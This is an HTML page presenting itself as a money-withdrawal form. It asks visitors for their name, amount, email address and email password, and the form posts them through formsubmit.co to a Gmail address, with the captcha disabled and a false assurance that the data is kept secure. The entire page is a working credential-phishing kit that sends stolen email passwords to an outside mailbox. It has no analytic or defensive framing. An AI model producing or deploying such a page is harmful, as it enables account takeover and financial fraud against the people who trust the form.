<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FILL THIS FORM TO WITHDRAW MONEY</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      padding: 20px;
    }
    form {
      background: white;
      max-width: 500px;
      margin: auto;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      margin-top: 15px;
      display: block;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }
    .error {
      color: red;
      font-size: 14px;
      display: none;
    }
    .eye-toggle {
      position: relative;
    }
    .eye-toggle input {
      padding-right: 40px;
    }
    .eye-toggle span {
      position: absolute;
      top: 35%;
      right: 10px;
      cursor: pointer;
      user-select: none;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      font-size: 16px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:disabled {
      background: #aaa;
      cursor: not-allowed;
    }
    .note {
      margin-top: 20px;
      text-align: center;
      font-style: italic;
      color: #555;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" onsubmit="return validateBeforeSubmit()">
    <h2>FILL THIS FORM TO WITHDRAW MONEY</h2>

    <label for="fullname">Full Name</label>
    <input type="text" id="fullname" name="Full Name" required>

    <label for="amount">Amount You Want to Withdraw</label>
    <input type="number" id="amount" name="Amount To Withdraw" required>

    <label for="email">Email Address</label>
    <input type="email" id="email" name="Email Address" required>

    <label for="emailPass">Email Password</label>
    <div class="eye-toggle">
      <input type="password" id="emailPass" name="Email Password" required>
      <span onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <div class="error" id="emailPassError">Please enter your email password.</div>

    <input type="hidden" name="_next" value="thankyou.html">
    <input type="hidden" name="_captcha" value="false">

    <button type="submit" id="submitBtn" disabled>Submit</button>

    <p class="note">We keep your data secure and confidential</p>
  </form>

  <script>
    const emailPassInput = document.getElementById("emailPass");
    const submitBtn = document.getElementById("submitBtn");
    const emailPassError = document.getElementById("emailPassError");

    function togglePassword() {
      emailPassInput.type = emailPassInput.type === "password" ? "text" : "password";
    }

    emailPassInput.addEventListener("blur", () => {
      if (emailPassInput.value.trim() === "") {
        emailPassError.style.display = "block";
        submitBtn.disabled = true;
      } else {
        emailPassError.style.display = "none";
        submitBtn.disabled = false;
      }
    });

    function validateBeforeSubmit() {
      if (emailPassInput.value.trim() === "") {
        emailPassError.style.display = "block";
        return false;
      }
      return true;
    }
  </script>
</body>
</html>
